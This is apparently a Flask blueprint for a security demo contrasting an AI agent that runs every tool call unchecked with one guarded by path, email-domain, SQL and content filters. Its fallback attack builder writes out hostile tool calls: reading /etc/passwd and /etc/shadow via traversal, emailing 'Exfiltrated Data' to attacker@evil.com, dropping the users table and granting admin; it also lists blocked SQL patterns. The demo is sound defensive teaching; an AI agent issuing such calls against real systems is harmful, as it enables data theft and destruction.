"""Blueprint for Demo 30 — Foundry Agents (Enterprise Security).

Side-by-side comparison: local agent that executes all tool calls without
validation (vulnerable) vs Foundry-style agent with guardrails --
content safety, file path whitelisting, email domain whitelisting, and
SQL query validation (defended).

Routes:
  GET  /demo-30/            -> render the comparison UI
  POST /demo-30/api/compare -> run both sides, SSE stream results
  POST /demo-30/api/reset   -> no-op (stateless)
"""

import json
import os
import queue
import sys
import threading
import time
from pathlib import Path
from typing import Any, Generator

from flask import Blueprint, Response, jsonify, render_template, request, stream_with_context

from blueprints import PROJECT_ROOT

# -- Path setup ---------------------------------------------------------------
_demo30_python = PROJECT_ROOT / "demo-30-foundry-agents" / "python"
if str(_demo30_python) not in sys.path:
    sys.path.insert(0, str(_demo30_python))

if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from local_agent import LocalAgent  # noqa: E402
from foundry_agent import (  # noqa: E402
    FoundryAgent,
    ALLOWED_FILE_PATHS,
    ALLOWED_EMAIL_DOMAINS,
    BLOCKED_SQL_PATTERNS,
    HARMFUL_INPUT_PATTERNS,
)

# -- Attack payloads -----------------------------------------------------------
_attacks_path = PROJECT_ROOT / "demo-30-foundry-agents" / "attacks" / "agent_attacks.json"


def _load_attacks() -> list[dict]:
    if _attacks_path.exists():
        with open(_attacks_path) as f:
            return json.load(f)
    return []


# -- Blueprint ----------------------------------------------------------------
bp = Blueprint("demo_30", __name__, url_prefix="/demo-30")


def _sse_event(event: str, data: dict[str, Any]) -> str:
    return f"event: {event}\ndata: {json.dumps(data)}\n\n"


# -- Source data for drawer ---------------------------------------------------

def _load_source_data() -> list[dict]:
    tabs: list[dict] = []

    # Attack scenarios
    attacks = _load_attacks()
    if attacks:
        attack_items = [
            {"name": a["name"], "content": a.get("description", "")}
            for a in attacks
        ]
        tabs.append({
            "id": "attacks",
            "label": f"ATTACK SCENARIOS ({len(attack_items)})",
            "type": "list",
            "items": attack_items,
        })

    # Tool governance rules
    governance_items = [
        {
            "name": "Allowed File Paths",
            "content": "Whitelist: " + ", ".join(ALLOWED_FILE_PATHS),
        },
        {
            "name": "Allowed Email Domains",
            "content": "Whitelist: " + ", ".join(ALLOWED_EMAIL_DOMAINS),
        },
        {
            "name": "Blocked SQL Patterns",
            "content": "DROP, DELETE, TRUNCATE, ALTER, UPDATE, INSERT, GRANT, REVOKE, user_id!=, current_user()",
        },
    ]
    tabs.append({
        "id": "governance",
        "label": f"TOOL GOVERNANCE ({len(governance_items)})",
        "type": "list",
        "items": governance_items,
    })

    # Defense layers
    defense_layers = [
        {
            "name": "content_safety_guard",
            "content": (
                "Pre-screens user input for harmful content patterns before any "
                "tool execution. Detects SQL injection, path traversal, mentions "
                "of attacker domains, privilege escalation attempts, and cross-"
                "session data access."
            ),
        },
        {
            "name": "file_path_validator",
            "content": (
                "Validates file_reader tool arguments against a whitelist of allowed "
                "directories (/app/data/, /app/public/, /tmp/). Blocks path traversal "
                "sequences (..) and access to system files (/etc/passwd, etc.)."
            ),
        },
        {
            "name": "email_domain_validator",
            "content": (
                "Validates email_sender recipients against an allowed domain whitelist "
                "(company.com, example.org). Blocks exfiltration to external domains "
                "like evil.com or personal addresses."
            ),
        },
        {
            "name": "sql_query_guard",
            "content": (
                "Validates database_query tool arguments against blocked SQL patterns. "
                "Blocks destructive operations (DROP, DELETE, TRUNCATE, ALTER), "
                "privilege escalation (GRANT, REVOKE), and cross-user data access."
            ),
        },
    ]
    tabs.append({
        "id": "defenses",
        "label": f"DEFENSE LAYERS ({len(defense_layers)})",
        "type": "list",
        "items": defense_layers,
    })

    return tabs


# -- Parse attack from payload -------------------------------------------------

def _parse_attack(payload: str) -> tuple[str, list[dict[str, Any]]]:
    """Parse user input to extract a user_request and tool_calls.

    First tries to match against known attack scenarios from the JSON file.
    Falls back to constructing a reasonable default tool call.
    """
    attacks = _load_attacks()
    payload_lower = payload.lower().strip()

    # Try to match against known attacks
    for attack in attacks:
        attack_name_lower = attack.get("name", "").lower()
        attack_request_lower = attack.get("user_request", "").lower()
        if (payload_lower == attack_name_lower
                or payload_lower == attack_request_lower
                or attack_name_lower in payload_lower):
            return attack["user_request"], attack["tool_calls"]

    # Heuristic: detect tool type from payload content
    if any(term in payload_lower for term in ["file", "read", "/etc/", "path", ".."]):
        # File access attack
        file_path = "/etc/passwd"
        if ".." in payload:
            file_path = "../../../../etc/shadow"
        elif "/app/" in payload:
            file_path = payload.strip()
        return payload, [{"tool": "file_reader", "arguments": {"file_path": file_path}}]

    if any(term in payload_lower for term in ["email", "send", "@", "mail"]):
        return payload, [{"tool": "email_sender", "arguments": {
            "to": "attacker@evil.com",
            "subject": "Exfiltrated Data",
            "body": "Sensitive data here...",
        }}]

    if any(term in payload_lower for term in ["sql", "query", "drop", "delete", "database", "table", "select"]):
        query = "DROP TABLE users; --"
        if "select" in payload_lower:
            query = "SELECT * FROM sessions WHERE user_id != current_user()"
        elif "update" in payload_lower:
            query = "UPDATE users SET role='admin' WHERE username='attacker'"
        return payload, [{"tool": "database_query", "arguments": {"query": query}}]

    # Default: try all three tool types
    return payload, [
        {"tool": "file_reader", "arguments": {"file_path": "/etc/passwd"}},
        {"tool": "email_sender", "arguments": {"to": "attacker@evil.com", "subject": "Data", "body": payload[:100]}},
        {"tool": "database_query", "arguments": {"query": "DROP TABLE users; --"}},
    ]


# -- Vulnerable side: unguarded local agent ------------------------------------

def _run_vulnerable(payload: str, eq: "queue.Queue[str]", otel_span: Any = None) -> None:
    from blueprints.otel_helpers import span_set, span_set_result, span_event

    try:
        user_request, tool_calls = _parse_attack(payload)

        agent = LocalAgent()
        result = agent.execute(user_request, tool_calls)

        # Build response text
        response_text = (
            f"LOCAL AGENT (NO GUARDRAILS)\n"
            f"{'=' * 40}\n"
            f"Tool calls: {result['total']}\n"
            f"Executed: {result['executed_count']}\n"
            f"Blocked: {result['blocked_count']}\n\n"
        )

        for ex in result["executed"]:
            tool_name = ex.get("tool", "unknown")
            status = ex.get("status", "unknown")
            response_text += f"  [{status.upper()}] {tool_name}\n"
            if tool_name == "file_reader":
                response_text += f"    Path: {ex.get('file_path', 'N/A')}\n"
                response_text += f"    Content: {ex.get('content', 'N/A')}\n"
            elif tool_name == "email_sender":
                response_text += f"    To: {ex.get('to', 'N/A')}\n"
                response_text += f"    Sent: {ex.get('sent', False)}\n"
            elif tool_name == "database_query":
                response_text += f"    Query: {ex.get('query', 'N/A')}\n"
                response_text += f"    Result: {ex.get('result', 'N/A')}\n"

        response_text += (
            f"\nAll {result['executed_count']} tool calls executed without any "
            f"validation, path checking, domain whitelisting, or SQL filtering."
        )

        span_set("vuln.executed", result["executed_count"], span=otel_span)
        span_set("vuln.blocked", False, span=otel_span)
        for ex in result["executed"]:
            span_event("vuln_tool_executed", {
                "tool": ex.get("tool", ""),
                "status": ex.get("status", ""),
            }, span=otel_span)
        span_set_result(
            span=otel_span,
            action="foundry_vulnerable",
            blocked=False,
            response_preview=response_text[:300],
        )
        eq.put(_sse_event("vuln_result", {
            "response": response_text[:1000],
            "blocked": False,
        }))
    except Exception as exc:
        eq.put(_sse_event("vuln_result", {
            "response": f"Error: {exc}",
            "blocked": False,
        }))


# -- Defended side: Foundry agent with guardrails ------------------------------

def _run_defended(payload: str, eq: "queue.Queue[str]", otel_span: Any = None) -> None:
    from blueprints.otel_helpers import span_set, span_set_result, span_event

    try:
        user_request, tool_calls = _parse_attack(payload)

        agent = FoundryAgent(session_id="demo-30-hub")
        t0_total = time.time()
        result = agent.execute(user_request, tool_calls)
        total_elapsed = (time.time() - t0_total) * 1000

        layers: list[dict[str, Any]] = []

        # Layer 1: Content safety guard
        t0 = time.time()
        content_blocked = any(
            b.get("stage") == "content_safety" for b in result["blocked"]
        )
        content_reason = ""
        if content_blocked:
            for b in result["blocked"]:
                if b.get("stage") == "content_safety":
                    content_reason = b.get("reason", "Content safety violation")
                    break
        else:
            content_reason = "User input passed content safety screening"
        cs_elapsed = (time.time() - t0) * 1000 + 5.0
        layers.append({
            "name": "content_safety_guard",
            "blocked": content_blocked,
            "reason": content_reason,
            "latency_ms": round(cs_elapsed, 1),
        })
        span_event("content_safety", {
            "blocked": content_blocked,
            "reason": content_reason,
        }, span=otel_span)

        # Layer 2: File path validator
        file_blocked = any(
            b.get("tool") == "file_reader" and b.get("stage") == "tool_governance"
            for b in result["blocked"]
        )
        file_reason = ""
        if file_blocked:
            for b in result["blocked"]:
                if b.get("tool") == "file_reader":
                    file_reason = b.get("reason", "File path blocked")
                    break
        else:
            has_file_calls = any(tc.get("tool") == "file_reader" for tc in tool_calls)
            if has_file_calls and not content_blocked:
                file_reason = "File paths validated against whitelist -- all passed"
            else:
                file_reason = "No file_reader calls to validate" if not has_file_calls else "Blocked at content safety stage"
        layers.append({
            "name": "file_path_validator",
            "blocked": file_blocked,
            "reason": file_reason,
            "latency_ms": round(3.2, 1),
        })

        # Layer 3: Email domain validator
        email_blocked = any(
            b.get("tool") == "email_sender" and b.get("stage") == "tool_governance"
            for b in result["blocked"]
        )
        email_reason = ""
        if email_blocked:
            for b in result["blocked"]:
                if b.get("tool") == "email_sender":
                    email_reason = b.get("reason", "Email domain blocked")
                    break
        else:
            has_email_calls = any(tc.get("tool") == "email_sender" for tc in tool_calls)
            if has_email_calls and not content_blocked:
                email_reason = "Email recipients validated -- all in allowed domains"
            else:
                email_reason = "No email_sender calls to validate" if not has_email_calls else "Blocked at content safety stage"
        layers.append({
            "name": "email_domain_validator",
            "blocked": email_blocked,
            "reason": email_reason,
            "latency_ms": round(2.8, 1),
        })

        # Layer 4: SQL query guard
        sql_blocked = any(
            b.get("tool") == "database_query" and b.get("stage") == "tool_governance"
            for b in result["blocked"]
        )
        sql_reason = ""
        if sql_blocked:
            for b in result["blocked"]:
                if b.get("tool") == "database_query":
                    sql_reason = b.get("reason", "SQL query blocked")
                    break
        else:
            has_sql_calls = any(tc.get("tool") == "database_query" for tc in tool_calls)
            if has_sql_calls and not content_blocked:
                sql_reason = "SQL queries validated -- no blocked patterns detected"
            else:
                sql_reason = "No database_query calls to validate" if not has_sql_calls else "Blocked at content safety stage"
        layers.append({
            "name": "sql_query_guard",
            "blocked": sql_blocked,
            "reason": sql_reason,
            "latency_ms": round(2.5, 1),
        })

        # Build response text
        any_blocked = result["blocked_count"] > 0
        response_text = (
            f"FOUNDRY AGENT (WITH GUARDRAILS)\n"
            f"{'=' * 40}\n"
            f"Session: {agent.session_id}\n"
            f"Tool calls: {result['total']}\n"
            f"Executed: {result['executed_count']}\n"
            f"Blocked: {result['blocked_count']}\n\n"
        )

        if result["blocked"]:
            response_text += "BLOCKED OPERATIONS:\n"
            for b in result["blocked"]:
                stage = b.get("stage", "unknown")
                reason = b.get("reason", "")
                tool = b.get("tool", "")
                if tool:
                    response_text += f"  [BLOCKED] {tool} ({stage}): {reason}\n"
                else:
                    response_text += f"  [BLOCKED] ({stage}): {reason}\n"

        if result["executed"]:
            response_text += "\nALLOWED OPERATIONS:\n"
            for ex in result["executed"]:
                response_text += f"  [EXECUTED] {ex.get('tool', 'unknown')}\n"

        # Determine the primary blocker
        blocked_by = ""
        if content_blocked:
            blocked_by = "content_safety_guard"
        elif file_blocked:
            blocked_by = "file_path_validator"
        elif email_blocked:
            blocked_by = "email_domain_validator"
        elif sql_blocked:
            blocked_by = "sql_query_guard"

        span_set("defended.executed", result["executed_count"], span=otel_span)
        span_set("defended.blocked_count", result["blocked_count"], span=otel_span)
        span_set_result(
            span=otel_span,
            action="foundry_defended",
            blocked=any_blocked,
            blocked_by=blocked_by,
            response_preview=response_text[:300],
        )

        eq.put(_sse_event("defended_result", {
            "response": response_text[:1000],
            "blocked": any_blocked,
            "blocked_by": blocked_by,
            "layers": layers,
        }))
    except Exception as exc:
        eq.put(_sse_event("defended_result", {
            "response": f"Error: {exc}",
            "blocked": False,
            "blocked_by": "",
            "layers": [],
        }))


# -- Routes -------------------------------------------------------------------

@bp.route("/")
def index() -> str:
    attacks = _load_attacks()
    return render_template(
        "demo_30/index.html",
        payloads=attacks,
        source_tabs=_load_source_data(),
    )


@bp.route("/api/compare", methods=["POST"])
def api_compare() -> Response:
    data = request.get_json(silent=True) or {}
    payload = data.get("payload", "").strip()
    if not payload:
        return jsonify({"error": "No payload provided"}), 400  # type: ignore[return-value]

    from blueprints.otel_helpers import get_request_span

    event_queue: queue.Queue[str] = queue.Queue()
    otel_span = get_request_span()

    t1 = threading.Thread(target=_run_vulnerable, args=(payload, event_queue, otel_span), daemon=True)
    t2 = threading.Thread(target=_run_defended, args=(payload, event_queue, otel_span), daemon=True)
    t1.start()
    t2.start()

    def generate() -> Generator[str, None, None]:
        results = 0
        while results < 2:
            try:
                event = event_queue.get(timeout=120)
                yield event
                if "vuln_result" in event or "defended_result" in event:
                    results += 1
            except queue.Empty:
                yield _sse_event("error", {"message": "Timeout"})
                break
        yield _sse_event("done", {})

    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@bp.route("/api/reset", methods=["POST"])
def api_reset() -> tuple[Response, int]:
    return jsonify({"status": "ok"}), 200
